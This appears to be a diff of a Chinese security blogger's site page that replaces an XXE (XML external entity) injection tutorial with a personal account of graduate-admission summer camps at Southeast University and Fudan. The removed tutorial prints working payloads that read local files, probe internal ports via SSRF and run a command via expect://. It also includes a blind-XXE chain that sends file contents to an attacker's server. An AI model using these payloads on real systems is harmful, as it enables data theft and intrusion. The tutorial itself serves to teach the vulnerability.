@@ -15,7 +15,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>xml注入攻击学习 · Sky&#39;s blog</title>
+    <title>东南-复旦保研经历及感想 · Sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Sky&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">xml注入攻击学习</a>
+                <a href="#" class="post-name">东南-复旦保研经历及感想</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            xml注入攻击学习
+            东南-复旦保研经历及感想
             <!-- 404 -->
             
         </h1>
@@ -259,20 +259,14 @@ height:50vh;
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
-                    <div class= post-intro-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "xml">xml</a>
-    
-</div>
-                
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">671</span> / Reading time: <span class="post-count">3 min</span></span>
+                        <span>Word count: <span class="post-count">2,024</span> / Reading time: <span class="post-count">7 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2017/08/18</span>
+                    <span class="post-intro-time">2018/07/18</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -396,28 +390,19 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>XML文件的解析依赖libxml库，而libxml2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的xml文件时未对xml文件引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，并且实体的URL支持file://和PHP://等协议，攻击者可以在xml文件中声明URI指向服务器本地的实体造成攻击。</p>
-<h2 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h2><p>解析xml文件时允许加载外部实体，没有过滤用户提交的参数 。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="读取本地文件"><a href="#读取本地文件" class="headerlink" title="读取本地文件"></a>读取本地文件</h3><p>以php环境为例，index.php内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $xml=simplexml_load_string($_GET[&apos;xml&apos;]);</span><br><span class="line">  print_r((string)$xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>利用各种协议可以读取文件。比如file协议，这里的测试环境为win，所以这里我选择读取h盘里的sky.txt。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///h://sky.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
-<p>将上述xml进行url编码后传进去，可以发现读取了sky.txt中的内容。<br>注：<br>如果要读取php文件，因为php、html等文件中有各种括号&lt;，&gt;，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
-<p>同样先经过url编码后再传入。</p>
-<h3 id="内网探测-SSRF"><a href="#内网探测-SSRF" class="headerlink" title="内网探测/SSRF"></a>内网探测/SSRF</h3><p>由于xml实体注入攻击可以利用<code>http://</code>协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
-<p>探测内网端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
-<p>攻击内网网站<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80/payload&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
-<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure></p>
-<h3 id="bind-xxe"><a href="#bind-xxe" class="headerlink" title="bind xxe"></a>bind xxe</h3><p>对于无回显的xml注入:<br>在你的vps上放1.xml文件，内容如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % f SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY % s SYSTEM &apos;http://你的vps/xxe.php?f=%f;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>再在你的vps上放xxe.php，内容如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    file_put_contents(<span class="string">"/tmp/1.txt"</span>, $_GET[<span class="string">'f'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>最后在可以写xml的页面写如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">  &lt;!ENTITY % r SYSTEM &quot;http://你的vps/1.xml&quot;&gt;</span><br><span class="line">  %r;</span><br><span class="line">  %all;</span><br><span class="line">  %s;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></p>
-<p>访问1.txt就可以获得flag的内容</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>真的很不容易，度过了最漫长的一个学期，所幸结果的是好的，我也可以满意的毕业了<br>我也算幸运，一共报了4个夏令营：东南、复旦、信工所、北航<br>除了北航只收了我们学院计科的年级第一外，其余均入选了<br>说一下简单的感想：<br>1.东南，夏令营收人很多，我们学校入营了8个人，最后拿到offer的有4，5个<br>2.复旦，我们学校就我一个进了，不知道是不是大佬们没报<br>3.信工所，我也是幸运的独苗XD<br>4.北航，gg，告辞<br>但是由于信工所的时间和复旦+考试时间疯狂撞（毕竟7天，太长了），于是我只能忍痛割爱，选择放弃</p>
+<h2 id="东南保研"><a href="#东南保研" class="headerlink" title="东南保研"></a>东南保研</h2><p>东南是我感觉相对轻松的一次夏令营，时间大约2天，行程安排很紧<br>第一天大概是听讲座，和老师交流<br>第二天是面试（往届似乎都有笔试，今年只有面试，很舒服）<br>面试的时候，我这一组是3个老师，一个负责英语提问，另外两个负责专业问题<br>首先进来是一个大约2分钟的自我介绍<br>然后老师会问一些专业问题，大概2~3个吧<br>第一个问题：你最擅长的一门学科是什么？<br>我当然说的是web安全，然后老师就问了2个关于web安全的问题<br>1.你觉得怎么构建一个安全的web体系？<br>2.说一下你渗透的大概流程<br>因为自己做过不少web相关的实战，所以答得还算游刃有余<br>大概说了一些流程，Bypass技巧，需要关注的点等等<br>个人感觉答完后老师还算满意，跟我推荐了在座一位老师，当时觉得也比较开心，应该是稳了（请允许我骄傲了一下）<br>然后英语问了一个很简略的问题，大致是你读研后想做什么？<br>然后就开心的结束了东南的旅程<br>最后很开心，优营的时候自己排在第一个233333，再次骄傲一下XD</p>
+<h2 id="复旦保研"><a href="#复旦保研" class="headerlink" title="复旦保研"></a>复旦保研</h2><p>复旦相对东南来说，压力可以说倍增了，由于东南的网络空间安全学院刚成立，所以前来报名的大多为211及部分985，并且收人力度也较大（可以说是性价比很高的一所学校了，趁刚开始收人，有意向的同学可以积极报名）<br>而复旦的竞争就激烈了非常多，首先是1600进80的夏令营选拨，我差点就没进去= =<br>然后是优秀的竞争对手，大概985高校很多，C9的高手也很多，而211的大多为年级第一，我也不知道自己一个rank 3/135的是怎么混进来的，也许是ctf奖项略多吧<br>然后是考核形式也是非常严格的<br>1.第一天是讲座宣讲<br>2.第二天是英语面试<br>3.第三天上午是机试<br>4.第三天下午是专业面试<br>首先谈谈讲座宣讲，刚开始来复旦的时候，发现复旦的计算机在学科评估中只有B+，而矿大都是B，当时是非常犹豫的<br>后来深入接触后，才发现和我想的差异非常多<br>在了解中，不难看出，复旦的教授们的水平堪称世界级的，顶会的文章发表多的让我惊叹<br>后来也得知，学科评估是按规模评比的，即学校收的人多，毕业的人多，评估也会相对高<br>而复旦是属于精英教育，是比较小众的，所以这方面可能存在劣势，但实力我个人认为远不止B+<br>光看复旦招收的硕士生个数就能看的出明显的对比<br>同时复旦也是C9中的顶级学校<br>应该能和复旦相抗衡的只有清北浙交四所了吧<br>然后谈谈英语面试<br>英语面试这一关我非常担忧，因为个人CET-4（别喷我，我超不喜欢英语）<br>然而面试的时候，老师还是非常nice的<br>是1对1的面试<br>老师问的问题都很通俗易懂：<br>1.英语自我介绍<br>2.你认为自己擅于编程吗？<br>我说我可能擅于吧，但我主要是做web安全的，做一些漏洞挖掘等<br>然后老师就往这方面问了<br>3.你觉得进攻和防守哪个更难，为什么？<br>然后我又bb了一大堆<br>4.你的兴趣爱好是什么？<br>我说了打篮球<br>5.你在篮球场上的位置是什么？PF/C或者其他？<br>我说了SG<br>然后就是一段娱乐性的瞎聊，balabala<br>最后愉快的出去了<br>然后是机试部分<br>机试是我最讨厌的东西，因为我对算法非常不感兴趣，尤其是知道了对手很多都是打过acm的，甚至有铜牌、银牌、金牌的得主<br>我是非常紧张的<br>复旦的机试上来8道题，是以问题的规模为难度划分的<br>大概是3个题一类，分为小，中，大三个规模<br>考的什么玩意儿我都忘得差不多了，基本是数组的一些操作，数据的并集，交集，输入的优化等吧（因为我个人较菜，可能描述不清= =，告辞）<br>这一关我个人感觉做的很差，不过复旦的上机是只能知道是否编译通过，不能知道是不是AC或者WA了什么的，所以我也不知道自己最后得了多少分，感觉应该是3/8吧<br>当然，有些题过了部分数据，也是可以给部分分的<br>最后是专业面试<br>因为自己擅于web安全，所以选择了网络空间安全这一学科，面试的过程中，也觉得自己做过不少web方面的实战，所以有些优势<br>大概问了如下问题<br>1.web安全常见漏洞，挑2个描述一下？<br>2.你刚说的2个漏洞应该如何防御？<br>3.当今市面上比较好的waf有哪些？<br>4.未来研究生要做什么？<br>5.你愿意专硕/直博吗？<br>大概就是这样，因为复旦的夏令营名额非常少，网络空间安全一级学科只有3个学硕名额= =<br>不过所幸最后成功获得了学硕名额233333，拿了offer真的非常开心</p>
+<h2 id="一些个人感想"><a href="#一些个人感想" class="headerlink" title="一些个人感想"></a>一些个人感想</h2><p>个人感觉成绩对于保研的作业是有，但是大概前五，或者前三的竞争还是在于项目/竞赛<br>尤其是对于著名高校，只收你学校一个人入营的时候，竞赛/项目真的尤为突出<br>然后对于网络空间安全这一方面，可以说是比较小众的了<br>在面试的时候，如果你做过ctf，或者实战的话，可以感觉到较为明显的优势<br>说出一些较深的理解，或者bypass手段等，都可以提升老师对你的印象<br>在我去的两次夏令营中，都感觉和我选择一个方向的同学，基本上是零基础（可能我没认识到巨佬，自己太菜了）<br>所以如果有这方面的经历，或者大二就提前开始学习某个方向的技术显得尤为重要</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>最后很幸运能拿到复旦的offer，听说2019年入学是要去江湾校区，搜了一些图片，真的很气派<br>也很幸运的入围了inforsec，打算到时候去江湾校区看看~<br>也祝各位都能有一个理想的结果！<br>搁置了2个月的web，发了好久的blog水文<br>终于又可以有时间专注于自己感兴趣的东西了！</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="http://skysec.top">一叶飘零</a>
-            <p>原文链接: <a href="http://skysec.top/2017/08/18/xml注入攻击学习/">http://skysec.top/2017/08/18/xml注入攻击学习/</a>
-            <p>发表日期: <a href="http://skysec.top/2017/08/18/xml注入攻击学习/">August 18th 2017, 10:57:46 am</a>
+            <p>原文链接: <a href="http://skysec.top/2018/07/18/东南-复旦保研经历及感想/">http://skysec.top/2018/07/18/东南-复旦保研经历及感想/</a>
+            <p>发表日期: <a href="http://skysec.top/2018/07/18/东南-复旦保研经历及感想/">July 18th 2018, 11:09:01 pm</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -425,17 +410,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2017/08/19/SSRF学习/" title= SSRF学习 >
-                    <div class="nextTitle">SSRF学习</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2017/08/18/密码学自学/" title= 密码学自学 >
-                    <div class="prevTitle">密码学自学</div>
+                <a href= "/2018/07/14/软件安全复习总结/" title= 软件安全复习总结 >
+                    <div class="prevTitle">软件安全复习总结</div>
                 </a>
             
         </li>
@@ -451,7 +431,7 @@ height:50vh;
 <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
 <script>
     var gitment = new Gitment({
-        id: "Fri Aug 18 2017 10:57:46 GMT+0800", // 可选。默认为 location.href
+        id: "Wed Jul 18 2018 23:09:01 GMT+0800", // 可选。默认为 location.href
         owner: 'skyofkinglove',
         repo: 'sky.github.io',
         oauth: {
@@ -555,7 +535,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞描述"><span class="toc-number">1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#形成原因"><span class="toc-number">2.</span> <span class="toc-text">形成原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#读取本地文件"><span class="toc-number">3.1.</span> <span class="toc-text">读取本地文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内网探测-SSRF"><span class="toc-number">3.2.</span> <span class="toc-text">内网探测/SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行"><span class="toc-number">3.3.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bind-xxe"><span class="toc-number">3.4.</span> <span class="toc-text">bind xxe</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#东南保研"><span class="toc-number">2.</span> <span class="toc-text">东南保研</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复旦保研"><span class="toc-number">3.</span> <span class="toc-text">复旦保研</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一些个人感想"><span class="toc-number">4.</span> <span class="toc-text">一些个人感想</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">5.</span> <span class="toc-text">后记</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
